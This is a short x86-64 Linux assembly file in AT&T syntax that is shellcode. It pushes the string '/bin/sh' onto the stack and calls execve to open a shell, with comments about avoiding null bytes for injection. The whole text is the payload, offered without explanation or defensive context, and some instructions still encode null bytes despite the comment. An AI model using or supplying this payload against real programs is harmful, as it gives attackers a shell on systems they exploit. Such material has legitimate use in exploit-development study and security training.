global _start
.section .text 
_start:
    //xor to create the null values without null directly
    xor %rax, %rax 
    push %rax
    mov %rsp, %rsi
    mov %rsp, %rdx
    //load /bin/sh encoded in little endian
    mov $0x68732F6E69622F, %rbx
    push %rbx
    mov %rsp, %rdi  
    //load 3b for the execve call
    mov $0x3B, %rax  
    syscall
